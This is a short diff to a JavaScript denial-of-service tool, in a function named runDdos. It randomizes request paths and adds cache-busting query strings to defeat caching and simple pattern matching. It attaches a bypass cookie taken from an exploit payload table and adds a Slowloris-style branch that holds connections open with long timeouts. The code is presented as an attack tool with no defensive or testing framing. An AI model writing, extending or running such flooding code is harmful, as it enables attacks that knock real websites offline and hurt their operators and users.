@@ -25,14 +25,17 @@ async function runDdos(stats, startTime, customCount = 0) {
             options.exploitCookie = EXPLOIT_PAYLOADS.SENTINEL_BYPASS.cookie;
         }
 
-        // Randomize path to bypass simple pattern matching and cache
         const paths = ['', '/', '/login', '/register', '/faq', '/terms', '/privasi'];
         const randomPath = paths[Math.floor(Math.random() * paths.length)];
-        
-        // Add random query params to defeat caching
         const cacheBuster = `?v=${Math.random().toString(36).substring(7)}&t=${Date.now()}`;
         
-        const res = await sendRequest(randomPath + cacheBuster, DDOS_CONFIG.METHOD, null, {}, options);
+        let res;
+        if (exploitType === 'SLOW_LORIS') {
+            // Simulasikan Slow HTTP dengan timeout tinggi dan data minim
+            res = await sendRequest(randomPath + cacheBuster, 'GET', null, { 'X-Slow': 'Keep-Alive' }, { ...options, timeout: 30000 });
+        } else {
+            res = await sendRequest(randomPath + cacheBuster, DDOS_CONFIG.METHOD, null, {}, options);
+        }
         
         if (res.status === 'SUCCESS') {
             stats.success++;
